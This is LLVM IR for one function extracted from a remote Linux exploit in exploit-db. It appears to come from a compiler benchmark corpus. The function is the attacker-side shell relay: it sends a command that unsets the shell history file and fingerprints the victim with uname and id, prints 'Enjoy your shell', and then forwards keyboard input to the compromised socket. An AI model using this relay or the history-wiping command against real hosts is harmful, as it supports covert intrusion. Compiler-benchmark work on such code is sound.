; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_878.c_shell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_878.c_shell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [44 x i8] c"unset HISTFILE; /bin/uname -a; /usr/bin/id\0A\00", align 1
@.str.1 = private unnamed_addr constant [22 x i8] c"[-] Enjoy your shell\0A\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.3 = private unnamed_addr constant [47 x i8] c"[-] shell(): error reading from socket: recv()\00", align 1
@.str.4 = private unnamed_addr constant [46 x i8] c"[-] shell(): error writing to stdout: write()\00", align 1
@.str.5 = private unnamed_addr constant [46 x i8] c"[-] shell(): error reading from stdin: read()\00", align 1
@.str.6 = private unnamed_addr constant [45 x i8] c"[-] shell(): error writing to socket: send()\00", align 1
@.str.7 = private unnamed_addr constant [24 x i8] c"[-] Connection closed.\0A\00", align 1
@llvm.used = appending global [1 x i8*] [i8* bitcast (void (i32)* @shell to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal void @shell(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca [2048 x i8], align 16
  %6 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  store i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str, i64 0, i64 0), i8** %4, align 8
  %7 = call i32 @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.1, i64 0, i64 0))
  %8 = call i32 @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  %9 = load i32, i32* %2, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = load i8*, i8** %4, align 8
  %12 = call i32 @strlen(i8* %11)
  %13 = call i64 @send(i32 %9, i8* %10, i32 %12, i32 0)
  br label %14

14:                                               ; preds = %1, %69
  %15 = call i32 @FD_ZERO(i32* %3)
  %16 = load i32, i32* %2, align 4
  %17 = call i32 @FD_SET(i32 %16, i32* %3)
  %18 = call i32 @FD_SET(i32 0, i32* %3)
  %19 = load i32, i32* %2, align 4
  %20 = add nsw i32 %19, 1
  %21 = call i64 @select(i32 %20, i32* %3, i32* null, i32* null, i32* null)
  %22 = icmp slt i64 %21, 0
  br i1 %22, label %23, label %24

23:                                               ; preds = %14
  br label %70

24:                                               ; preds = %14
  %25 = load i32, i32* %2, align 4
  %26 = call i64 @FD_ISSET(i32 %25, i32* %3)
  %27 = icmp ne i64 %26, 0
  br i1 %27, label %28, label %47

28:                                               ; preds = %24
  %29 = load i32, i32* %2, align 4
  %30 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %31 = call i32 @recv(i32 %29, i8* %30, i32 2048, i32 0)
  store i32 %31, i32* %6, align 4
  %32 = icmp slt i32 %31, 0
  br i1 %32, label %33, label %35

33:                                               ; preds = %28
  %34 = call i32 @perror(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.3, i64 0, i64 0))
  br label %72

35:                                               ; preds = %28
  %36 = load i32, i32* %6, align 4
  %37 = icmp eq i32 %36, 0
  br i1 %37, label %38, label %39

38:                                               ; preds = %35
  br label %70

39:                                               ; preds = %35
  %40 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %41 = load i32, i32* %6, align 4
  %42 = call i64 @write(i32 1, i8* %40, i32 %41)
  %43 = icmp slt i64 %42, 0
  br i1 %43, label %44, label %46

44:                                               ; preds = %39
  %45 = call i32 @perror(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.4, i64 0, i64 0))
  br label %72

46:                                               ; preds = %39
  br label %47

47:                                               ; preds = %46, %24
  %48 = call i64 @FD_ISSET(i32 0, i32* %3)
  %49 = icmp ne i64 %48, 0
  br i1 %49, label %50, label %69

50:                                               ; preds = %47
  %51 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %52 = call i32 @read(i32 0, i8* %51, i32 2048)
  store i32 %52, i32* %6, align 4
  %53 = icmp slt i32 %52, 0
  br i1 %53, label %54, label %56

54:                                               ; preds = %50
  %55 = call i32 @perror(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.5, i64 0, i64 0))
  br label %72

56:                                               ; preds = %50
  %57 = load i32, i32* %2, align 4
  %58 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %59 = load i32, i32* %6, align 4
  %60 = call i64 @send(i32 %57, i8* %58, i32 %59, i32 0)
  %61 = icmp slt i64 %60, 0
  br i1 %61, label %62, label %64

62:                                               ; preds = %56
  %63 = call i32 @perror(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.6, i64 0, i64 0))
  br label %72

64:                                               ; preds = %56
  %65 = load i32, i32* %6, align 4
  %66 = icmp eq i32 %65, 0
  br i1 %66, label %67, label %68

67:                                               ; preds = %64
  br label %70

68:                                               ; preds = %64
  br label %69

69:                                               ; preds = %68, %47
  br label %14

70:                                               ; preds = %67, %38, %23
  %71 = call i32 @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.7, i64 0, i64 0))
  br label %72

72:                                               ; preds = %70, %62, %54, %44, %33
  ret void
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i64 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i64 @select(i32, i32*, i32*, i32*, i32*) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i64 @write(i32, i8*, i32) #1

declare dso_local i32 @read(i32, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
